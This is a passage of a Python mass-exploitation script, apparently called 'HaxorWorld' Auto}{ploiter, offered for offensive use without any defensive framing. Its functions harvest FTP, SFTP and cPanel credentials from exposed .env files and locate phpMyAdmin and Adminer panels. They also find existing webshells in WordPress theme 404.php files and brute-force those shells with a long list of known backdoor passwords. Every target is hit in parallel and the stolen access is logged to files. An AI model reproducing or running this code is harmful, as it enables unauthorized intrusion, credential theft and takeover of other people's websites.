                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found FTP")
                open("result/ftpacc.txt","a").write('{}\n'.format(url)+'HOST: {}\n'.format(ftphost)+'USER: {}\n'.format(ftpuser)+'PASS: {}\n'.format(ftppass)+'PORT: {}\n\n'.format(ftpport))
            else: 
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found FTP")
            op = x.get(url, headers=head, timeout=7, verify=False)
            if 'SFTP_USER=' in op.text or 'SFTP_PASS=' in op.text:
                sftpuser = str(re.findall('SFTP_USER=(.*)', op.text)[0]).split("''")[0]
                sftppass = str(re.findall('SFTP_PASS=(.*)', op.text)[0]).split("''")[0]
                sftphost = str(re.findall('SFTP_HOST=(.*)', op.text)[0]).split("''")[0]
                sftpport = str(re.findall('SFTP_PORT=(.*)', op.text)[0]).split("''")[0]
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found SFTP")
                open("result/sftpacc.txt","a").write('{}\n'.format(url)+'HOST: {}\n'.format(sftphost)+'USER: {}\n'.format(sftpuser)+'PASS: {}\n'.format(sftppass)+'PORT: {}\n\n'.format(sftpport))
            else: 
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found SFTP")
            op = x.get(url, headers=head, timeout=7, verify=False)
            if 'CPANEL_USERNAME=' in op.text or 'CPANEL_PASSWORD=' in op.text:
                cpuser = str(re.findall('CPANEL_USERNAME=(.*)', op.text)[0]).split("''")[0]
                cppass = str(re.findall('CPANEL_PASSWORD=(.*)', op.text)[0]).split("''")[0]
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found CPANEL")
                open("result/cpanel.txt","a").write('{}\n'.format(url)+'USER: {}\n'.format(cpuser)+'PASS: {}\n'.format(cppass))
            else: 
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found CPANEL")
            ho = ['/adminer.php','/Adminer.php','/adminer-4.8.1.php','/phpmyadmin','/adm.php','/phpMyadmin','/phpMyAdmin','/phpmysql','/pma','/pMa','/PMA','/mysql','/php-my-admin','/dbsql','/PhpMyAdmin']
            for hh in ho:
                httpp = x.get("http://"+i+hh, headers=head, timeout=7, verify=False)
                if 'phpmyadmin.net' in httpp.text:
                    print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found PMA")
                    open("result/phpmyadmin.txt","a").write('{}\n'.format("http://"+i+hh)+'USER: {}\n'.format(dbuser)+'PASS: {}\n\n'.format(dbpass))
                    break
                elif 'Login - Adminer' in httpp.text:
                    print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Adminer")
                    am = open("result/adminer.txt","a").write('{}\n'.format("http://"+i+hh)+'HOST: {}\n'.format(dbhost)+'USER: {}\n'.format(dbuser)+'PASS: {}\n'.format(dbpass)+'NAME: {}\n\n'.format(dbname))
                    break
                else :
                    print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found PMA/ADM")
        else :
            print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found ENV")
    except :
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('HaxorWorld | Shell - {}'.format(Good))
    else :
        sys.stdout.write('\x1b]2; HaxorWorld | Shell - {}\x07'.format(Good))

def shell(i) :
    global Good
    x = requests.session()
    head = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 
    'Upgrade-Insecure-Requests': '1', 
    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
    'Accept-Encoding': 'gzip, deflate', 
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
    'referer': 'www.google.com'}
    try :
        listaa = ['wp-content/themes/sketch/404.php','wp/wp-content/themes/sketch/404.php','wordpress/wp-content/themes/sketch/404.php','blog/wp-content/themes/sketch/404.php','new/wp-content/themes/sketch/404.php','test/wp-content/themes/sketch/404.php','old/wp-content/themes/sketch/404.php','backup/wp-content/themes/sketch/404.php']
        for xox in listaa :
            url = ("http://"+i+"/"+xox)
            url2 = ("https://"+i+"/"+xox)
            req = x.get(url, headers=head, timeout=7, verify=False).text
            if "Password" in req and "submit" in req and "#56AD15" in req :
                print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Shell")
                open("result/shellpw.txt","a").write(url+"\n")
                listpw = ['','*****','022627raflixsec','12qwaszx','1337','133721','1n73ction','22XC','404','555','731','a5e8z77','abcder','achan','admin','adminhoki','aerul','akudimana','alfa','am*guAW8.ryDgz-TYF','anggie21','AnonymousFox','asdsdggenu','awokawok2','b3t4kun','BangPat?1337','banyumas','bheart2206','cantik','cmonqwe123#@!','con7extshell','cyb3r','DapsquaD','DeadSec','default','elena','G00DV1N','geronimo123','gfus','ghost287','HACKED','hacker0882','hackmeDON','Hasilhoki','haurgeulis','huypizdaprovoda','hxr1337','iamtheking','IndexAttacker','IndoSec','IndoXploit','JH23FVDG32FD','jupiter2709','katib','kem','kontolcokasu','kontolgaceng','kontoll471','kpxwbYBP4hQK','l o l','leksak98@','memes','mini-shell','Mo2a0123','mravast','myrepublic','oppaidragon','password','peler','peler666','Penolong40','phpshell','phpshells','pucek12345','r00t','r00tsh3ll','rbbd95','root','root@kudajumping','Sandra@1199','stusa','Stusa','sys123','T1KUS90T','tbl','thopik123','tunafeesh','w0rms','xleet','zaza','zeeblaxx','{ IndoSec }']
                for pw in listpw :
                    cek = x.post(url, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    cek = x.post(url2, headers=head, data={'pass': pw, 'watching': 'submit'}, timeout=7, verify=False).text
                    if "[ Writeable ]" in cek :
                        print(fw+"["+fg+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fg+" Found Pass Shell")
                        open("result/shell.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Pass Shell")
                break
            else :
                print(fw+"["+fr+"LPH"+fw+"] "+fw+i+" "+fw+"<<"+fr+" Not Found Shell")
    except :
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('HaxorWorld | Shell - {}'.format(Good))
    else :
        sys.stdout.write('\x1b]2; HaxorWorld | Shell - {}\x07'.format(Good))

def exploit(i):
    try:
        shell(i)
        alfa(i)
        rsf(i)
        dzs(i)
        env(i)
        phpunit(i)
        kcf(i)
        rfm(i)
        wpins(i)
    except:
       pass

if __name__ == "__main__":
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """             ______________
       ,===:'.,            `-._
            `:.`---.__         `-._
              `:.     `--.         `.
                \.        `.         `.
        (,,(,    \.         `.   ____,-`.,
     (,'     `/   \.   ,--.___`.'
 ,  ,'  ,--.  `,   \.;'         `
  `{D, {    \  :    \;
    V,,'    /  /    //
    j;;    /  ,' ,-//.    ,---.      ,
    \;'   /  ,' /  _  \  /  _  \   ,'/
          \   `'  / \  `'  / \  `.' /
           `.___,'   `.__,'   `.__,'  Haxor World

\n"""
    for N, line in enumerate( x.split( "\n" ) ):
        sys.stdout.write( " \x1b[1;%dm%s%s\n " % (random.choice( colors ), line, clear) )
        time.sleep( 0.05 )
    p = Pool(100)
    p.map(exploit, target)
    p.close()
    p.join()
    print("\n")
    print(fr+"|-------------------------------------|")
    print(fr+"|             "+fw+"CLEAR BRO  "+fr+"             |")
    print(fr+"|-------------------------------------|")
    print(fr+"|                                     |")
    print(fr+"|                                     |")
    print(fr+"|         "+fw+"Auto"+fr+"}{"+fw+"ploiter Tools"+fr+"         |")
    print(fr+"| "+fw+"Powered by Leviathan Perfect Hunter"+fr+" |")
    print(fr+"|                                     |")
    print(fr+"|                                     |")
    print(fr+"|-------------------------------------|")
